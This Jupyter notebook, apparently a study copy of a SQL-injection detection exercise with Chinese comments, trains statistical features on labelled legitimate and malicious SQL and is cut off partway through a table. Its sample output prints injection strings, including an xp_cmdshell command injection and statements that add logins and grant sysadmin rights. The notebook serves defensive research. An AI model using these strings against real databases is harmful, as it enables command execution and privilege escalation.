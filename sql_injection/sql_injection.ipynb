{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SQL Injection Exercise\n",
    "\n",
    "<div style=\"float: right;\"><img src=\"files/images/sql_injection.gif\" width=\"300px\"></div>\n",
    "<font size=4>\"SQL injection is a code injection technique, used to attack data driven applications, in which malicious SQL statements areA SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.\" -OWASP\n",
    "<br>\n",
    "<br><br>\n",
    "** All Code and IPython Notebooks for this talk http://clicksecurity.github.io/data_hacking **\n",
    "<br><br>\n",
    "Tools:\n",
    "<ul>\n",
    "  <li>sqlmap: Automatic SQL injection and database takeover tool (http://sqlmap.org)\n",
    "  <li>JBroFuzz (https://www.owasp.org/index.php/JBroFuzz)\n",
    "  <li>sqlparse (https://github.com/andialbrecht/sqlparse)\n",
    "  <br>\n",
    "  <br><br>\n",
    "  <li> IPython: A mad scientist notebook! (http://ipython.org)\n",
    "  <ul><li> What did you do?\n",
    "  <li> How did you do it?\n",
    "  <li> Can I repoduce it?\n",
    "  <li> Easy to share:\n",
    "  <ul>\n",
    "  <li>[NB Viewer](http://nbviewer.ipython.org)\n",
    "  <li>[Reddit IPython](http://www.reddit.com/r/ipython)\n",
    "  </ul>\n",
    "  </ul>\n",
    "  <br>\n",
    "  <li> Pandas: Python Data Analysis Library (http://pandas.pydata.org)\n",
    "  <ul>\n",
    "  <li> A fast and efficient DataFrame object\n",
    "  <li> Great set of IO Tools\n",
    "  <li> Fantastic handling of missing data\n",
    "  <li> Flexible reshaping and pivoting\n",
    "  <li> Slicing, indexing, and subsetting\n",
    "  </ul>\n",
    "</ul>\n",
    "\n",
    "Approach:\n",
    "<ul>\n",
    "  <li> Gather data (Thanks to Ray VanHoose for his assistance!)\n",
    "  <li> Exploration and Understanding\n",
    "  <li> Some Simple Statistics\n",
    "  <li> Feature Vectors\n",
    "  <li> Random Forest Machine Learning\n",
    "</ul>\n",
    "</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0.19.0'"
      ]
     },
     "execution_count": 119,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import sklearn.feature_extraction\n",
    "sklearn.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0.20.3'"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "pd.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'2.0.2'"
      ]
     },
     "execution_count": 121,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import matplotlib\n",
    "matplotlib.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0.2.0'"
      ]
     },
     "execution_count": 122,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import data_hacking\n",
    "data_hacking.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Plotting defaults\n",
    "import matplotlib.pyplot as plt\n",
    "# 使用%matplotlib命令可以将matplotlib的图表直接嵌入到Notebook之中\n",
    "%matplotlib inline\n",
    "# ref: https://matplotlib.org/users/customizing.html#matplotlib-rcparams\n",
    "# matplotlib的全局设置参数\n",
    "plt.rcParams['font.size'] = 18.0 # The font.size property is the default font size for text, given in pts.\n",
    "plt.rcParams['figure.figsize'] = 12.0, 5.0 # figure size in inches"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# A plotting helper method\n",
    "def plot_it(df,label_x,label_y):\n",
    "    fig, ax = plt.subplots(subplot_kw={'facecolor':'#EEEEE5'})\n",
    "    ax.grid(color='grey', linestyle='solid')\n",
    "    df.T.plot(kind='bar', logx=False, rot=0, ax=ax, colormap='PiYG')\n",
    "    ax.legend(loc=0, prop={'size':14})\n",
    "    plt.subplots_adjust(left=0, right=1, bottom=0, top=1, wspace=0, hspace=0)\n",
    "    plt.xlabel(label_x)\n",
    "    plt.ylabel(label_y)\n",
    "    return ax"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "malicious    12892\n",
      "legit         1003\n",
      "Name: type, dtype: int64\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious\n",
       "1           create user name identified by 'pass123'  malicious\n",
       "2  create user name identified by pass123 tempora...  malicious\n",
       "3               exec sp_addlogin 'name' , 'password'  malicious\n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Read in a set of SQL statements from various sources\n",
    "import os\n",
    "basedir = 'data'\n",
    "filelist = os.listdir(basedir) \n",
    "df_list = [] # DataFrame对象list\n",
    "for file in filelist:\n",
    "    # ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_csv.html\n",
    "    # 将csv文件数据读取到pandas框架的DataFrame对象\n",
    "    df = pd.read_csv(os.path.join(basedir,file), sep='\\r\\n', names=['raw_sql'], header=None, engine='python')\n",
    "    # 这里把合法('legit')SQL数据全部放在了一个独立文件中，文件命名为legit.txt\n",
    "    # 完成了数据标记过程\n",
    "    df['type'] = 'legit' if file.split('.')[0] == 'legit' else 'malicious'\n",
    "    df_list.append(df)\n",
    "\n",
    "# ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.concat.html\n",
    "# ignore_index设置为True表示合并后的pandas对象list采用0, ..., n - 1下标，忽略原始输入pandas对象的下标\n",
    "dataframe = pd.concat(df_list, ignore_index=True)\n",
    "# ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.dropna.html\n",
    "# 缺失值处理，inplace=True表示就地删除包含None值的行，默认axis=0表示按行检查和处理，axis=1表示按列处理\n",
    "dataframe.dropna(inplace=True)\n",
    "# ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.Series.value_counts.html\n",
    "# dataframe['type']的类型是<class 'pandas.core.series.Series'>\n",
    "print(dataframe['type'].value_counts())\n",
    "# 默认返回前5行数据 ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.head.html\n",
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/Users/huangwei/.pyenv/versions/3.6.2/bin/python\r\n"
     ]
    }
   ],
   "source": [
    "!which python"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Use the SQLParse module: sqlparse is a non-validating SQL parser module for Python\n",
    "# https://github.com/andialbrecht/sqlparse\n",
    "# pip install sqlparse\n",
    "import sqlparse\n",
    "def parse_it(raw_sql):\n",
    "    parsed = sqlparse.parse(raw_sql)\n",
    "    # ref: https://docs.python.org/3/reference/expressions.html#displays-for-lists-sets-and-dictionaries\n",
    "    # 以下是非常pythonic的写法，学名是comprehension\n",
    "    return [token._get_repr_name() for parse in parsed for token in parse.tokens if token._get_repr_name() != 'Whitespace']\n",
    "\n",
    "# ref: https://www.python-course.eu/python3_lambda.php\n",
    "dataframe['parsed_sql'] = dataframe['raw_sql'].map(lambda x: parse_it(x))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "对比 [长亭科技的SQL注入检测方案](https://blog.chaitin.cn/sqlchop-the-sqli-detection-engine/) ，基于SQLParse的这里的SQL注入检测算法存在以下缺陷：\n",
    "\n",
    "* SQLParse不是一个基于SQL语法检查和解析引擎的分析器，因此对于一些SQL注入的代码混淆手段存在天然缺陷\n",
    "* （WAF的通病和挑战）缺少对后端被保护应用、数据库和业务的上下文理解。例如：\n",
    "    * 博客程序允许用户发送富文本数据，用户编写了一篇研究SQL注入技巧的文章\n",
    "    * 攻击者使用了一些针对特定数据库的SQL语法特性来构造攻击向量，但针对当前被保护数据库来说，这些攻击向量并不会达到攻击效果。因此，检测引擎基于当前应用环境会产生大量误报\n",
    "\n",
    "根据上述长亭科技的博客推荐，可以试试用[client9/libinjection](https://github.com/client9/libinjection/)来替换掉或补充到这里的SQLParse的角色和作用。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \n",
       "0  [Single, Identifier, Float, Float, Float, Erro...  \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...  \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...  \n",
       "3              [Keyword, Identifier, IdentifierList]  \n",
       "4              [Keyword, Identifier, IdentifierList]  "
      ]
     },
     "execution_count": 128,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Looking at the SQL tokens is 'kinda' interesting but sequences of tokens and transitions\n",
    "# between tokens seems more meaningful so we're also going to compute sequences by\n",
    "# computing NGrams for every SQL statement...\n",
    "def ngrams(lst, N):\n",
    "    ngrams = []\n",
    "    for n in range(N):\n",
    "        # ref: https://docs.python.org/3/library/functions.html#zip\n",
    "        # python内置函数，zip将多个迭代器“对位”合并为一个新迭代器，合并后的新迭代器长度取决于最短的输入迭代器，超长部分会被截断舍弃\n",
    "        # 官方建议zip仅用于处理长度相等的迭代器合并，避免数据截断丢失\n",
    "        ngrams += zip(*(lst[i:] for i in range(n+1)))\n",
    "    return [str(tuple) for tuple in ngrams]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "dataframe['sequences'] = dataframe['parsed_sql'].map(lambda x: ngrams(x, 3))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### We'd like to run some simple statistics to see what correlations the data might contain. Here we want to see if certain tokens or sets of transitions are indicative of malicious sql statements.\n",
    "\n",
    "> In statistics, G-tests are likelihood-ratio or maximum likelihood statistical significance tests that are increasingly being used in situations where chi-squared tests were previously recommended.\n",
    "\n",
    "> G-tests是 似然率 或者 最大似然显著性统计检验。\n",
    "\n",
    "#### G-test is for goodness of fit to a distribution and for independence in contingency tables. It's related to chi-squared, multinomial and Fisher's exact test, please see http://en.wikipedia.org/wiki/G_test.\n",
    "\n",
    "#### 当一个属性(如性别)有两个(如男，女)或多个变量，而且对于属性变量有着理论的期望比值(如1：1)。G-test就是用于验证观测变量值是否符合理论期望的比值。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Helper method\n",
    "def token_expansion(series, types):\n",
    "    _tokens, _types = zip(*[(token,token_type) for t_list,token_type in zip(series,types) for token in t_list])\n",
    "    return pd.Series(_tokens), pd.Series(_types)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0        [('Single',), ('Identifier',), ('Float',), ('F...\n",
       "1        [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "2        [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "3        [('Keyword',), ('Identifier',), ('IdentifierLi...\n",
       "4        [('Keyword',), ('Identifier',), ('IdentifierLi...\n",
       "5        [('DML',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "6        [('Keyword',), ('Keyword',), ('Keyword',), ('I...\n",
       "7        [('DML',), ('Keyword',), ('Function',), ('Keyw...\n",
       "8        [('DDL',), ('Keyword',), ('Keyword',), ('Ident...\n",
       "9        [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "10       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "11       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "12       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "13       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "14       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "15       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "16       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "17       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "18       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "19       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "20       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "21       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "22       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "23       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "24       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "25       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "26       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "27       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "28       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "29       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "                               ...                        \n",
       "13865    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13866    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13867    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13868    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13869    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13870    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13871    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13872    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13873    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13874    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13875    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13876    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13877    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13878    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13879    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13880    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13881    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13882    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13883    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13884    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13885    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13886    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13887    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13888    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13889    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13890    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13891    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13892    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13893    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13894    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "Name: sequences, Length: 13895, dtype: object"
      ]
     },
     "execution_count": 132,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe['sequences']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>legit</th>\n",
       "      <th>malicious</th>\n",
       "      <th>legit_cd</th>\n",
       "      <th>malicious_cd</th>\n",
       "      <th>total_cd</th>\n",
       "      <th>legit_exp</th>\n",
       "      <th>legit_g</th>\n",
       "      <th>malicious_exp</th>\n",
       "      <th>malicious_g</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>('Single',)</th>\n",
       "      <td>6.0</td>\n",
       "      <td>10993.0</td>\n",
       "      <td>0.000546</td>\n",
       "      <td>0.999454</td>\n",
       "      <td>10999.0</td>\n",
       "      <td>1227.149219</td>\n",
       "      <td>-63.848275</td>\n",
       "      <td>9771.850781</td>\n",
       "      <td>2588.913574</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Single', 'Identifier')</th>\n",
       "      <td>0.0</td>\n",
       "      <td>8310.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>8310.0</td>\n",
       "      <td>927.139741</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>7382.860259</td>\n",
       "      <td>1966.120676</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier',)</th>\n",
       "      <td>1258.0</td>\n",
       "      <td>16881.0</td>\n",
       "      <td>0.069353</td>\n",
       "      <td>0.930647</td>\n",
       "      <td>18139.0</td>\n",
       "      <td>2023.753039</td>\n",
       "      <td>-1196.183313</td>\n",
       "      <td>16115.246961</td>\n",
       "      <td>1567.329580</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Punctuation',)</th>\n",
       "      <td>152.0</td>\n",
       "      <td>7811.0</td>\n",
       "      <td>0.019088</td>\n",
       "      <td>0.980912</td>\n",
       "      <td>7963.0</td>\n",
       "      <td>888.425241</td>\n",
       "      <td>-536.733275</td>\n",
       "      <td>7074.574759</td>\n",
       "      <td>1546.978855</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier', 'Single')</th>\n",
       "      <td>1.0</td>\n",
       "      <td>4221.0</td>\n",
       "      <td>0.000237</td>\n",
       "      <td>0.999763</td>\n",
       "      <td>4222.0</td>\n",
       "      <td>471.045004</td>\n",
       "      <td>-12.309907</td>\n",
       "      <td>3750.954996</td>\n",
       "      <td>996.675974</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Single', 'Identifier', 'Single')</th>\n",
       "      <td>0.0</td>\n",
       "      <td>4170.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>4170.0</td>\n",
       "      <td>465.243408</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>3704.756592</td>\n",
       "      <td>986.609292</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier', 'Single', 'Identifier')</th>\n",
       "      <td>0.0</td>\n",
       "      <td>4162.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>4162.0</td>\n",
       "      <td>464.350854</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>3697.649146</td>\n",
       "      <td>984.716517</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Identifier', 'Identifier')</th>\n",
       "      <td>1.0</td>\n",
       "      <td>3956.0</td>\n",
       "      <td>0.000253</td>\n",
       "      <td>0.999747</td>\n",
       "      <td>3957.0</td>\n",
       "      <td>441.479176</td>\n",
       "      <td>-12.180262</td>\n",
       "      <td>3515.520824</td>\n",
       "      <td>933.977797</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Keyword', 'DML', 'IdentifierList')</th>\n",
       "      <td>28.0</td>\n",
       "      <td>3157.0</td>\n",
       "      <td>0.008791</td>\n",
       "      <td>0.991209</td>\n",
       "      <td>3185.0</td>\n",
       "      <td>355.347783</td>\n",
       "      <td>-142.289978</td>\n",
       "      <td>2829.652217</td>\n",
       "      <td>691.183458</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>('Punctuation', 'Punctuation')</th>\n",
       "      <td>1.0</td>\n",
       "      <td>2858.0</td>\n",
       "      <td>0.000350</td>\n",
       "      <td>0.999650</td>\n",
       "      <td>2859.0</td>\n",
       "      <td>318.976236</td>\n",
       "      <td>-11.530233</td>\n",
       "      <td>2540.023764</td>\n",
       "      <td>674.194440</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         legit  malicious  legit_cd  \\\n",
       "('Single',)                                6.0    10993.0  0.000546   \n",
       "('Single', 'Identifier')                   0.0     8310.0  0.000000   \n",
       "('Identifier',)                         1258.0    16881.0  0.069353   \n",
       "('Punctuation',)                         152.0     7811.0  0.019088   \n",
       "('Identifier', 'Single')                   1.0     4221.0  0.000237   \n",
       "('Single', 'Identifier', 'Single')         0.0     4170.0  0.000000   \n",
       "('Identifier', 'Single', 'Identifier')     0.0     4162.0  0.000000   \n",
       "('Identifier', 'Identifier')               1.0     3956.0  0.000253   \n",
       "('Keyword', 'DML', 'IdentifierList')      28.0     3157.0  0.008791   \n",
       "('Punctuation', 'Punctuation')             1.0     2858.0  0.000350   \n",
       "\n",
       "                                        malicious_cd  total_cd    legit_exp  \\\n",
       "('Single',)                                 0.999454   10999.0  1227.149219   \n",
       "('Single', 'Identifier')                    1.000000    8310.0   927.139741   \n",
       "('Identifier',)                             0.930647   18139.0  2023.753039   \n",
       "('Punctuation',)                            0.980912    7963.0   888.425241   \n",
       "('Identifier', 'Single')                    0.999763    4222.0   471.045004   \n",
       "('Single', 'Identifier', 'Single')          1.000000    4170.0   465.243408   \n",
       "('Identifier', 'Single', 'Identifier')      1.000000    4162.0   464.350854   \n",
       "('Identifier', 'Identifier')                0.999747    3957.0   441.479176   \n",
       "('Keyword', 'DML', 'IdentifierList')        0.991209    3185.0   355.347783   \n",
       "('Punctuation', 'Punctuation')              0.999650    2859.0   318.976236   \n",
       "\n",
       "                                            legit_g  malicious_exp  \\\n",
       "('Single',)                              -63.848275    9771.850781   \n",
       "('Single', 'Identifier')                   0.000000    7382.860259   \n",
       "('Identifier',)                        -1196.183313   16115.246961   \n",
       "('Punctuation',)                        -536.733275    7074.574759   \n",
       "('Identifier', 'Single')                 -12.309907    3750.954996   \n",
       "('Single', 'Identifier', 'Single')         0.000000    3704.756592   \n",
       "('Identifier', 'Single', 'Identifier')     0.000000    3697.649146   \n",
       "('Identifier', 'Identifier')             -12.180262    3515.520824   \n",
       "('Keyword', 'DML', 'IdentifierList')    -142.289978    2829.652217   \n",
       "('Punctuation', 'Punctuation')           -11.530233    2540.023764   \n",
       "\n",
       "                                        malicious_g  \n",
       "('Single',)                             2588.913574  \n",
       "('Single', 'Identifier')                1966.120676  \n",
       "('Identifier',)                         1567.329580  \n",
       "('Punctuation',)                        1546.978855  \n",
       "('Identifier', 'Single')                 996.675974  \n",
       "('Single', 'Identifier', 'Single')       986.609292  \n",
       "('Identifier', 'Single', 'Identifier')   984.716517  \n",
       "('Identifier', 'Identifier')             933.977797  \n",
       "('Keyword', 'DML', 'IdentifierList')     691.183458  \n",
       "('Punctuation', 'Punctuation')           674.194440  "
      ]
     },
     "execution_count": 133,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# The data hacking repository has a simple stats module we're going to use\n",
    "import data_hacking.simple_stats as ss\n",
    "\n",
    "# Spin up our g_test class\n",
    "g_test = ss.GTest()\n",
    "\n",
    "# Here we'd like to see how various sql tokens and transitions are related.\n",
    "# Is there an association with particular token sets and malicious SQL statements.\n",
    "tokens, types = token_expansion(dataframe['sequences'], dataframe['type'])\n",
    "df_ct, df_cd, df_stats = g_test.highest_gtest_scores(tokens, types, matches=0, N=0)\n",
    "\n",
    "df_stats.sort_values('malicious_g', ascending=0).head(10)\n",
    "\n",
    "# The table below shows raw counts, conditional distributions, expected counts, and g-test score."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x11c417f98>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Now plot the the head() and the tail() of the dataframe to see who's been naughty or nice\n",
    "sorted_df = df_stats.sort_values('malicious_g', ascending=0)\n",
    "naughty = sorted_df.head(7)\n",
    "nice = sorted_df.tail(7).sort_values('malicious_g', ascending=0)\n",
    "naughty_and_nice = pd.concat([naughty, nice])\n",
    "ax = plot_it(naughty_and_nice[['malicious_g']],'SQL Command Types','G-Test Scores')\n",
    "#ax.set_xlim(.2, 1.4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
